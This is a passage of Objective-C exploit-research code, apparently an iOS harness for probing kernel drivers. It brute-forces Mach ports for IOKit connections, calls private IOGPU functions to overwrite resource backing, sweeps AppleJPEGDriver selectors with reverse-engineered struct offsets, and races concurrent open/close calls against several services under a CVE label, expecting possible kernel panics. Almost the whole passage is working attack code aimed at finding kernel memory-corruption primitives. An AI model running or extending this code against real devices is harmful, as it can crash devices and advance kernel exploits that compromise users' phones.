        Class unwClass = object_getClass(unwrapped);
        unsigned int unwCount = 0;
        Ivar *unwIvars = class_copyIvarList(unwClass, &unwCount);
        [out appendFormat:@"unwrapped class: %s (%u ivars)\n", class_getName(unwClass), unwCount];
        for (unsigned int i = 0; i < unwCount; i++) {
            const char *uname = ivar_getName(unwIvars[i]);
            ptrdiff_t uoffset = ivar_getOffset(unwIvars[i]);
            if (uname && uoffset > 0) {
                uintptr_t uval = *(uintptr_t *)((uintptr_t)(__bridge void *)unwrapped + uoffset);
                [out appendFormat:@"  unw[%u] %s off=%td val=0x%lx\n",
                 i, uname, uoffset, (unsigned long)uval];
                if (uval != 0 && uval < 0x10000) {
                    mtlConn = (io_connect_t)uval;
                    [out appendFormat:@"  → candidate io_connect_t: %u\n", mtlConn];
                }
            }
        }
        free(unwIvars);

        // If still not found, create a buffer and scan its resourceRef
        if (!mtlConn) {
            id<MTLDevice> dev = mtl;
            id buf = [dev newBufferWithLength:4096 options:MTLResourceStorageModeShared];
            if (buf) {
                SEL rrSel = NSSelectorFromString(@"resourceRef");
                id bufUnwrapped = buf;
                for (int i = 0; i < 8; i++) {
                    NSString *cn = NSStringFromClass([bufUnwrapped class]);
                    if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
                    SEL bs = NSSelectorFromString(@"baseObject");
                    if (![bufUnwrapped respondsToSelector:bs]) break;
                    id base = ((id (*)(id, SEL))objc_msgSend)(bufUnwrapped, bs);
                    if (!base || base == bufUnwrapped) break;
                    bufUnwrapped = base;
                }
                if ([bufUnwrapped respondsToSelector:rrSel]) {
                    void *resRef = ((void *(*)(id, SEL))objc_msgSend)(bufUnwrapped, rrSel);
                    [out appendFormat:@"IOGPU resourceRef: %p\n", resRef];
                    if (resRef) {
                        // Scan first 32 words of the resource handle for io_connect_t
                        for (int i = 0; i < 32; i++) {
                            uintptr_t rval = *((uintptr_t *)resRef + i);
                            [out appendFormat:@"  res[%d] = 0x%lx\n", i, (unsigned long)rval];
                            if (rval != 0 && rval < 0x10000) {
                                mtlConn = (io_connect_t)rval;
                                [out appendFormat:@"  → candidate io_connect_t: %u\n", mtlConn];
                            }
                        }
                    }
                } else {
                    [out appendString:@"resourceRef selector not available\n"];
                }
            } else {
                [out appendString:@"buffer creation failed\n"];
            }
        }
    }
    {
        // Brute-force Mach port scan: test every port in the task as io_connect_t
        [out appendString:@"\n--- Mach port brute-force scan ---\n"];
        mach_port_type_t ptype;
        int portFound = 0;
        mach_port_name_t pn;
        for (pn = 0x100; pn < 0x3000; pn++) {
            ptype = 0;
            mach_port_type(mach_task_self(), pn, &ptype);
            if (ptype & 1) {
                kern_return_t pr = pCall2(pn, 0, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
                if (pr != 0x10000003) {
                    mtlConn = pn;
                    [out appendFormat:@"  port %u -> 0x%08x REAL io_connect_t\n", pn, (unsigned)pr];
                    portFound = 1;
                    break;
                }
            }
        }
        [out appendFormat:@"scanned ports found=%d\n", portFound];
    }    p010Checkpoint(out, @"U1b_ivars_scanned");

    if (!mtlConn) {
        [out appendString:@"STOP: could not find io_connect_t anywhere\n"];
        return out;
    }
    [out appendFormat:@"using io_connect_t: %u\n", mtlConn];
    p010Checkpoint(out, @"U1c_conn_found");

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    if (!pCall || !pClose) { [out appendString:@"STOP dlsym\n"]; return out; }

    io_connect_t conn = mtlConn;
    [out appendFormat:@"using io_connect_t: %u\n", conn];
    p010Checkpoint(out, @"U2_conn");

    // Metal might need to initialize the UC before accepting method calls.
    // Create a command queue + command buffer to trigger UC init.
    @autoreleasepool {
        id<MTLCommandQueue> mtlQueue = [mtl newCommandQueue];
        if (mtlQueue) {
            [out appendFormat:@"MTLCommandQueue: %@\n", [mtlQueue label]];
            id<MTLCommandBuffer> cmd = [mtlQueue commandBuffer];
            if (cmd) {
                [out appendString:@"MTLCommandBuffer created\n"];
                [cmd commit];
                [cmd waitUntilCompleted];
                [out appendString:@"MTLCommandBuffer committed\n"];
            }
        } else {
            [out appendString:@"MTLCommandQueue: nil (may not be available on iOS)\n"];
        }
    }
    p010Checkpoint(out, @"U2a_metal_init");

    // Re-extract io_connect_t after Metal init (might have changed)
    if (mtlConn) {
        id buf2 = [mtl newBufferWithLength:4096 options:MTLResourceStorageModeShared];
        if (buf2) {
            id bufUnwrapped = buf2;
            for (int i = 0; i < 8; i++) {
                NSString *cn = NSStringFromClass([bufUnwrapped class]);
                if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
                SEL bs = NSSelectorFromString(@"baseObject");
                if (![bufUnwrapped respondsToSelector:bs]) break;
                id base = ((id (*)(id, SEL))objc_msgSend)(bufUnwrapped, bs);
                if (!base || base == bufUnwrapped) break;
                bufUnwrapped = base;
            }
            SEL rrSel = NSSelectorFromString(@"resourceRef");
            if ([bufUnwrapped respondsToSelector:rrSel]) {
                void *resRef = ((void *(*)(id, SEL))objc_msgSend)(bufUnwrapped, rrSel);
                if (resRef) {
                    for (int i = 0; i < 32; i++) {
                        uintptr_t rval = *((uintptr_t *)resRef + i);
                        if (rval != 0 && rval < 0x10000) {
                            mtlConn = (io_connect_t)rval;
                            [out appendFormat:@"post-init io_connect_t: %u\n", mtlConn];
                            break;
                        }
                    }
                }
            }
        }
    }

    // Update conn to post-init mtlConn (may have changed during Metal init)
    conn = mtlConn;
    [out appendFormat:@"post-init conn for sweep: %u\n", conn];

    // P009 path: use IOGPU.framework directly (bypasses IOConnectCallMethod)
    [out appendString:@"\n--- P009 IOGPU.framework test ---\n"];
    void *gpufw = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!gpufw) gpufw = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!gpufw) {
        [out appendString:@"STOP: IOGPU.framework not found\n"];
    } else {
        typedef int (*IOGPUReplaceBytes_t)(void *resource, void *bytes, uint64_t length);
        typedef uint32_t (*IOGPUGetType_t)(void *resource);
        typedef uint64_t (*IOGPUGetU64_t)(void *resource);
        IOGPUReplaceBytes_t replaceBytes = dlsym(gpufw, "IOGPUResourceReplaceBackingWithBytes");
        IOGPUGetType_t getType = dlsym(gpufw, "IOGPUResourceGetResourceType");
        IOGPUGetU64_t getGPULen = dlsym(gpufw, "IOGPUResourceGetGPUVirtualAddressLength");
        IOGPUGetU64_t getGPUVA = dlsym(gpufw, "IOGPUResourceGetGPUVirtualAddress");
        [out appendFormat:@"IOGPU.framework symbols: replace=%@ type=%@ len=%@ va=%@\n",
         replaceBytes ? @"OK" : @"MISSING",
         getType ? @"OK" : @"MISSING",
         getGPULen ? @"OK" : @"MISSING",
         getGPUVA ? @"OK" : @"MISSING"];

        if (replaceBytes && getType) {
            id<MTLDevice> dev = mtl;
            id buf = [dev newBufferWithLength:4096 options:MTLResourceStorageModeShared];
            if (buf) {
                // Unwrap to get resourceRef
                id bufUnwrapped = buf;
                for (int i = 0; i < 8; i++) {
                    NSString *cn = NSStringFromClass([bufUnwrapped class]);
                    if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
                    SEL bs = NSSelectorFromString(@"baseObject");
                    if (![bufUnwrapped respondsToSelector:bs]) break;
                    id base = ((id (*)(id, SEL))objc_msgSend)(bufUnwrapped, bs);
                    if (!base || base == bufUnwrapped) break;
                    bufUnwrapped = base;
                }
                SEL rrSel = NSSelectorFromString(@"resourceRef");
                void *resRef = NULL;
                if ([bufUnwrapped respondsToSelector:rrSel]) {
                    resRef = ((void *(*)(id, SEL))objc_msgSend)(bufUnwrapped, rrSel);
                }
                [out appendFormat:@"resourceRef: %p\n", resRef];
                if (resRef) {
                    uint32_t typ = getType(resRef);
                    uint64_t gva = getGPUVA ? getGPUVA(resRef) : 0;
                    uint64_t glen = getGPULen ? getGPULen(resRef) : 0;
                    [out appendFormat:@"type=0x%x GPUVA=0x%llx len=%llu\n", typ, gva, glen];

                    // Try replace_backing_bytes (P009 operation)
                    uint8_t testData[16];
                    memset(testData, 0xAA, sizeof(testData));
                    int r = replaceBytes(resRef, testData, sizeof(testData));
                    [out appendFormat:@"replace_backing_bytes -> 0x%08x\n", (unsigned)r];
                    if (r == 0) {
                        [out appendString:@"  *** IOGPU.framework WORKS -- UC is functional ***\n"];
                    }
                }
            } else {
                [out appendString:@"no buffer or resourceRef\n"];
            }
        } else {
            [out appendString:@"no buffer\n"];
        }
    }

    // Selector sweep (for reference -- may all fail if IOConnectCallMethod is not the right API)
    uint8_t inStruct[0x1000];
    memset(inStruct, 0, sizeof(inStruct));
    *(uint64_t *)(inStruct + 16) = 1;
    *(uint64_t *)(inStruct + 24) = 1;
    uint64_t scalarIn[4] = {0, 0, 0, 0};
    uint64_t scalarOut = 0;
    uint32_t scalarOutCnt = 1;

    for (uint32_t sel = 0; sel <= 10; sel++) {
        uint32_t sizes[] = {1, 32, 0x100, 0x408, 0};
        for (int si = 0; sizes[si] != 0; si++) {
            uint32_t soutCnt = 1;
            uint64_t sout = 0;
            kern_return_t r = pCall(conn, sel, scalarIn, 4, inStruct, sizes[si],
                                    &sout, &soutCnt, NULL, NULL);
            [out appendFormat:@"sel=%u size=0x%x -> 0x%08x\n", sel, sizes[si], (unsigned)r];
            if (r != 0x10000003) {
                [out appendFormat:@"  *** NEW: 0x%08x ***\n", (unsigned)r];
            }
        }
    }
    p010Checkpoint(out, @"U3_sweep_done");

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010ConnRace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 connection lifecycle race -- open+close concurrent\n"];
    [out appendString:@"No struct needed -- races IOKit connection management\n"];
    [out appendString:@"CVE-2026-43805: race in IOKit state handling\n"];
    [out appendString:@"Not KRW -- race trigger test\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { [out appendString:@"STOP dlopen\n"]; return out; }
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pMainPort) {
        [out appendString:@"STOP dlsym\n"]; return out;
    }

    // Try multiple services -- some might be more racy than others.
    const char *services[] = {
        "AppleJPEGDriver",
        "IOPlatformExpertDevice",
        "AppleARMIO",
        "AppleA7IOP",
    };
    int nServices = (int)(sizeof(services) / sizeof(services[0]));

    dispatch_queue_t q = dispatch_queue_create("p010.conn", DISPATCH_QUEUE_CONCURRENT);

    for (int si = 0; si < nServices; si++) {
        const char *svcName = services[si];
        [out appendFormat:@"\n--- Racing %@ (N=100 open+close) ---\n", [NSString stringWithUTF8String:svcName]];

        CFMutableDictionaryRef matching = pMatching(svcName);
        if (!matching) { [out appendFormat:@"%@: matching fail\n", [NSString stringWithUTF8String:svcName]]; continue; }

        __block int openOk = 0;
        __block int openFail = 0;
        __block int closeOk = 0;
        __block int closeFail = 0;
        __block int newCode = 0;

        dispatch_group_t g = dispatch_group_create();

        for (int i = 0; i < 100; i++) {
            // Thread A: open connection
            dispatch_group_async(g, q, ^{
                io_service_t svc = pGet(*pMainPort, pMatching(svcName));
                if (!svc) { __sync_fetch_and_add(&openFail, 1); return; }
                io_connect_t c = 0;
                kern_return_t kr = pOpen(svc, mach_task_self(), 0, &c);
                if (kr == KERN_SUCCESS && c) {
                    __sync_fetch_and_add(&openOk, 1);
                    // Immediately close -- race with other opens
                    pClose(c);
                } else {
                    __sync_fetch_and_add(&openFail, 1);
                }
                pRelease(svc);
            });
            // Thread B: also open+close on same service simultaneously
            dispatch_group_async(g, q, ^{
                io_service_t svc = pGet(*pMainPort, pMatching(svcName));
                if (!svc) return;
                io_connect_t c = 0;
                kern_return_t kr = pOpen(svc, mach_task_self(), 0, &c);
                if (kr == KERN_SUCCESS && c) {
                    pClose(c);
                    __sync_fetch_and_add(&closeOk, 1);
                } else {
                    __sync_fetch_and_add(&closeFail, 1);
                }
                pRelease(svc);
            });
        }
        dispatch_group_wait(g, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
        CFRelease(matching);
        [out appendFormat:@"%@: openOk=%d openFail=%d closeOk=%d closeFail=%d new=%d\n",
         [NSString stringWithUTF8String:svcName], openOk, openFail, closeOk, closeFail, newCode];
    }

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"If panic: race in IOKit connection lifecycle. Do NOT re-tap.\n"];
    return out;
}

+ (NSString *)runP008HighSelSweep {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P008 high-selector sweep -- sel 8-25 with filled struct\n"];
    [out appendString:@"RE'd offsets: srcID@0x2ac dstID@0x2b0 pixelsX@0x428 pixelsY@0x42c\n"];
    [out appendString:@"Goal: find selector that passes task port to surface lookup\n"];
    [out appendString:@"Not KRW\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosH) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pCall || !pMainPort ||
        !iosCreate || !iosGetID) {
        [out appendString:@"STOP dlsym\n"]; return out;
    }

    NSDictionary *surfProps = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @(64*4),
        @"IOSurfaceAllocSize": @(64*64*4),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    IOSurfaceRef src = iosCreate((__bridge CFDictionaryRef)surfProps);
    IOSurfaceRef dst = iosCreate((__bridge CFDictionaryRef)surfProps);
    if (!src || !dst) { [out appendString:@"STOP surface\n"]; return out; }
    uint32_t srcID = iosGetID(src);
    uint32_t dstID = iosGetID(dst);
    [out appendFormat:@"src=%u dst=%u\n", srcID, dstID];

    CFMutableDictionaryRef matching = pMatching("AppleJPEGDriver");
    io_service_t service = matching ? pGet(*pMainPort, matching) : 0;
    if (!service) { [out appendString:@"STOP service\n"]; CFRelease(src); CFRelease(dst); return out; }
    io_connect_t conn = 0;
    kern_return_t kr = pOpen(service, mach_task_self(), 0, &conn);
    pRelease(service);
    if (kr != KERN_SUCCESS) { [out appendString:@"OPEN FAIL\n"]; CFRelease(src); CFRelease(dst); return out; }
    [out appendFormat:@"conn: %u\n", conn];

    enum { kStruct = 0x1000 };

    // Try sel 8-25 with filled struct (RE'd offsets).
    for (uint32_t sel = 8; sel <= 25; sel++) {
        uint8_t *buf = calloc(1, kStruct);
        *(uint32_t *)(buf + 0x2ac) = srcID;
        *(uint32_t *)(buf + 0x2b0) = dstID;
        *(uint32_t *)(buf + 0x428) = 64;
        *(uint32_t *)(buf + 0x42c) = 64;
        *(uint32_t *)(buf + 0x80) = 0;

        uint8_t outS[kStruct]; size_t outC = sizeof(outS);
        kern_return_t r = pCall(conn, sel, NULL, 0, buf, kStruct, NULL, NULL, outS, &outC);
        [out appendFormat:@"sel=%-2u -> 0x%08x", sel, (unsigned)r];
        if (r == 0) [out appendString:@" (OK!)"];
        else if ((unsigned)r == 0xe00002c2) [out appendString:@" BadArg"];
        else if ((unsigned)r == 0xe00002bc) [out appendString:@" Error"];
        else if ((unsigned)r == 0xe00002cc) [out appendString:@" NoSpace"];
        else [out appendString:@" (NEW!)"];
        [out appendString:@"\n"];
        free(buf);
        if (r == 0) break;
    }

    pClose(conn);
    CFRelease(src);
    CFRelease(dst);
    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"Read: NEW or OK = found selector with task port; then surface lookup should succeed\n"];
    return out;
}

+ (NSString *)runP008TypeSweep {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P008 IOServiceOpen type sweep -- try types 0-5\n"];
    [out appendString:@"param_1[0x140] might only be set for certain types\n"];
    [out appendString:@"Not KRW\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosH) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pCall || !pMainPort ||
        !iosCreate || !iosGetID) {
        [out appendString:@"STOP dlsym\n"]; return out;
    }

    NSDictionary *surfProps = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @(64*4),
        @"IOSurfaceAllocSize": @(64*64*4),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    IOSurfaceRef src = iosCreate((__bridge CFDictionaryRef)surfProps);
    IOSurfaceRef dst = iosCreate((__bridge CFDictionaryRef)surfProps);
    if (!src || !dst) { [out appendString:@"STOP surface\n"]; return out; }
    uint32_t srcID = iosGetID(src);
    uint32_t dstID = iosGetID(dst);
    [out appendFormat:@"src=%u dst=%u\n", srcID, dstID];

    CFMutableDictionaryRef matching = pMatching("AppleJPEGDriver");
    io_service_t service = matching ? pGet(*pMainPort, matching) : 0;
    if (!service) { [out appendString:@"STOP service\n"]; CFRelease(src); CFRelease(dst); return out; }

    enum { kStruct = 0x1000 };

    for (uint32_t type = 0; type <= 5; type++) {
        io_connect_t conn = 0;
        kern_return_t kr = pOpen(service, mach_task_self(), type, &conn);
        if (kr != KERN_SUCCESS) {
            [out appendFormat:@"type=%u: OPEN FAIL 0x%08x\n", type, (unsigned)kr];
            continue;
        }
        [out appendFormat:@"type=%u: conn=%u ", type, conn];

        uint8_t *buf = calloc(1, kStruct);
        *(uint32_t *)(buf + 0x2ac) = srcID;
        *(uint32_t *)(buf + 0x2b0) = dstID;
        *(uint32_t *)(buf + 0x428) = 64;
        *(uint32_t *)(buf + 0x42c) = 64;
        *(uint32_t *)(buf + 0x80) = 0;

        uint8_t outS[kStruct]; size_t outC = sizeof(outS);
        kern_return_t r = pCall(conn, 5, NULL, 0, buf, kStruct, NULL, NULL, outS, &outC);
        [out appendFormat:@"sel=5 -> 0x%08x", (unsigned)r];
        if (r == 0) [out appendString:@" (OK!)"];
        else if ((unsigned)r == 0xe00002c2) [out appendString:@" BadArg"];
        else if ((unsigned)r == 0xe00002bc) [out appendString:@" Error"];
        else if ((unsigned)r == 0xe00002cc) [out appendString:@" NoSpace"];
        else [out appendString:@" (NEW!)"];
        [out appendString:@"\n"];
        free(buf);
        pClose(conn);
        if (r == 0) break;
    }

    pRelease(service);
    CFRelease(src);
    CFRelease(dst);
    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"Read: NEW or OK = type sets param_1[0x140] correctly -> surface lookup succeeds\n"];
    return out;
}

+ (NSString *)runP008SurfaceNamespaceProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P008 surface namespace probe\n"];
    [out appendString:@"Is our IOSurface global or task-local?\n"];
    [out appendString:@"If global: JPEG driver should find it. If not: need Metal mapping.\n"];
    [out appendString:@"Not KRW\n"];

    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) { [out appendString:@"STOP dlopen IOSurface\n"]; return out; }

    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    // IOSurfaceLookup is private -- try dlsym
    typedef IOSurfaceRef (*IOSurfaceLookup_t)(uint32_t);
    IOSurfaceLookup_t iosLookup = dlsym(iosH, "IOSurfaceLookup");
    if (!iosCreate || !iosGetID) { [out appendString:@"STOP dlsym\n"]; return out; }

    NSDictionary *surfProps = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @(64*4),
        @"IOSurfaceAllocSize": @(64*64*4),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    IOSurfaceRef surf = iosCreate((__bridge CFDictionaryRef)surfProps);
    if (!surf) { [out appendString:@"STOP surface create\n"]; return out; }
    uint32_t surfID = iosGetID(surf);
    [out appendFormat:@"surface id=%u\n", surfID];

    // Can we look up our own surface from userspace?
    if (iosLookup) {
        IOSurfaceRef found = iosLookup(surfID);
        [out appendFormat:@"IOSurfaceLookup(%u) -> %@\n", surfID, found ? @"FOUND (global)" : @"NULL (task-local)"];
        if (found) {
            [out appendString:@"Surface is GLOBAL -- JPEG driver should find it too.\n"];
            [out appendString:@"But JPEG driver returns NoSpace -- driver uses different task namespace.\n"];
        } else {
            [out appendString:@"Surface is TASK-LOCAL -- JPEG driver can't find it.\n"];
            [out appendString:@"Need Metal mapping or different surface sharing to make it global.\n"];
        }
    } else {
        [out appendString:@"IOSurfaceLookup not available via dlsym -- can't test namespace\n"];
    }

    CFRelease(surf);
    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"Next: if global but driver can't find -> driver uses kernel_task, need caller task port\n"];
    return out;
}

+ (NSString *)runP008MetalSurfaceProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P008 + P009 crossover -- Metal-mapped surface to JPEG\n"];
    [out appendString:@"Metal mapping might change surface owner or make it findable\n"];
    [out appendString:@"Not KRW\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosH) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    typedef IOSurfaceRef (*IOSurfaceLookup_t)(uint32_t);
    IOSurfaceLookup_t iosLookup = dlsym(iosH, "IOSurfaceLookup");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pCall || !pMainPort ||
        !iosCreate || !iosGetID) {
        [out appendString:@"STOP dlsym\n"]; return out;
    }

    // Create IOSurface
    NSDictionary *surfProps = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @(64*4),
        @"IOSurfaceAllocSize": @(64*64*4),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    IOSurfaceRef src = iosCreate((__bridge CFDictionaryRef)surfProps);
    IOSurfaceRef dst = iosCreate((__bridge CFDictionaryRef)surfProps);
    if (!src || !dst) { [out appendString:@"STOP surface\n"]; return out; }
    uint32_t srcID = iosGetID(src);
    uint32_t dstID = iosGetID(dst);
    [out appendFormat:@"surface src=%u dst=%u\n", srcID, dstID];

    // Map src via Metal (like P009 does)
    id mtlDevice = MTLCreateSystemDefaultDevice();
    id mtlCommandQueue = nil;
    id mtlBuffer = nil;
    if (mtlDevice) {
        SEL qSel = NSSelectorFromString(@"newCommandQueue");
        mtlCommandQueue = ((id (*)(id, SEL))objc_msgSend)(mtlDevice, qSel);
        SEL bufSel = NSSelectorFromString(@"newBufferWithIOSurface:");
        mtlBuffer = ((id (*)(id, SEL, IOSurfaceRef))objc_msgSend)(mtlDevice, bufSel, src);
        [out appendFormat:@"Metal buffer: %@\n", mtlBuffer ? @"OK" : @"FAIL"];
    } else {
        [out appendString:@"Metal: no device\n"];
    }

    // Re-lookup after Metal mapping
    if (iosLookup && mtlBuffer) {
        IOSurfaceRef found = iosLookup(srcID);
        [out appendFormat:@"IOSurfaceLookup after Metal: %@\n", found ? @"FOUND" : @"NULL"];
    }

    // Try JPEG driver with Metal-mapped surface
    CFMutableDictionaryRef matching = pMatching("AppleJPEGDriver");
    io_service_t service = matching ? pGet(*pMainPort, matching) : 0;
    if (!service) { [out appendString:@"STOP service\n"]; CFRelease(src); CFRelease(dst); return out; }
    io_connect_t conn = 0;
    kern_return_t kr = pOpen(service, mach_task_self(), 0, &conn);
    pRelease(service);
    if (kr != KERN_SUCCESS) { [out appendString:@"OPEN FAIL\n"]; CFRelease(src); CFRelease(dst); return out; }
    [out appendFormat:@"conn: %u\n", conn];

    enum { kStruct = 0x1000 };
    uint8_t *buf = calloc(1, kStruct);
    *(uint32_t *)(buf + 0x2ac) = srcID;

    *(uint32_t *)(buf + 0x2b0) = dstID;
    *(uint32_t *)(buf + 0x428) = 64;
    *(uint32_t *)(buf + 0x42c) = 64;
    *(uint32_t *)(buf + 0x80) = 0;

    uint8_t outS[kStruct]; size_t outC = sizeof(outS);
    kern_return_t r = pCall(conn, 5, NULL, 0, buf, kStruct, NULL, NULL, outS, &outC);
    [out appendFormat:@"JPEG sel=5 (Metal surface) -> 0x%08x", (unsigned)r];
    if (r == 0) [out appendString:@" (OK!)"];
    else if ((unsigned)r == 0xe00002c2) [out appendString:@" BadArg"];
    else if ((unsigned)r == 0xe00002bc) [out appendString:@" Error"];
    else if ((unsigned)r == 0xe00002cc) [out appendString:@" NoSpace"];
    else [out appendString:@" (NEW!)"];
    [out appendString:@"\n"];

    free(buf);
    pClose(conn);
    CFRelease(src);
    CFRelease(dst);
    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"Read: OK or NEW = Metal mapping changed surface namespace -> P008 unblocked!\n"];
    return out;
}

+ (NSString *)runP008NonSurfaceSweep {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P008 non-surface sweep -- sel=6/16/17/18 (no IOSurface IDs)\n"];
    [out appendString:@"On 18.7.5: expect past BadArgument if no current_task gate.\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
